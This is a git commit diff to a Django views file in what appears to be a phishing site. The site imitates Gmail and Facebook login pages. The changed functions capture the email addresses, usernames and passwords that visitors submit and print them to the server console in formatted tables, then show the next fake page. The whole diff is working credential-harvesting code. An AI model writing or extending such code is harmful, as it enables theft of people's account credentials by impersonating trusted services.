28f1f67d5251e5f47ac806c8722b6d2c8d86f4c1
babucarr32 <baboucarry@gmail.com>
2023-02-05 14:57:48 +0000

    Created a separate function for gmail

--- Sites/views.py
+++ Sites/views.py
@@ -5,18 +5,34 @@ def facebook(request):
 
 
 def gmail(request):
-    return render(request, 'gmail.html')
+    if request.method == 'POST':
+        try:
+            if request.POST['gmailUsername']:
+                print("-"*32)
+                print("|"+ " "*10+"Email"+ " "*12+ "   |")
+                print("-"*32)
+                print("|       " + request.POST['gmailUsername'] + "     |       ")
+                print("-"*32)
+                return render(request, 'gmail2.html')
+        except:
+            if request.POST['gmailPassword']:
+                print("-"*32)
+                print("|"+ " "*10+"Password"+ " "*12+ "|")
+                print("-"*32)
+                print("|       " + request.POST['gmailPassword'] + "     |       ")
+                print("-"*32)
+                return render(request, 'gmail2.html')
+    else:
+        return render(request, 'gmail.html')
 
-def signup(request):
-    try:
-        if request.POST['gmailUsername']:
-            print("This is from gmail")
-            return render(request, 'gmail2.html')
-    except: 
-        if request.method == 'POST': #User has info and wants an an account
-            print("-"*62)
-            print("|"+ " "*10+"Username"+ " "*12+ "  |" + " "*8+"Password"+ " "*11 + "|")
-            print("-"*62)
-            print("|       " + request.POST['username'] + "     |       " + request.POST['password']+ "          |")
-            print("-"*62)
-            return render(request, 'facebook.html')
+def signup(request): 
+    if request.method == 'POST': #User has info and wants an an account
+        print("-"*62)
+        print("|"+ " "*10+"Username"+ " "*12+ "  |" + " "*8+"Password"+ " "*11 + "|")
+        print("-"*62)
+        print("|       " + request.POST['username'] + "     |       " + request.POST['password']+ "          |")
+        print("-"*62)
+        return render(request, 'facebook.html')
+        
+def gmailSignup(request):
+    pass
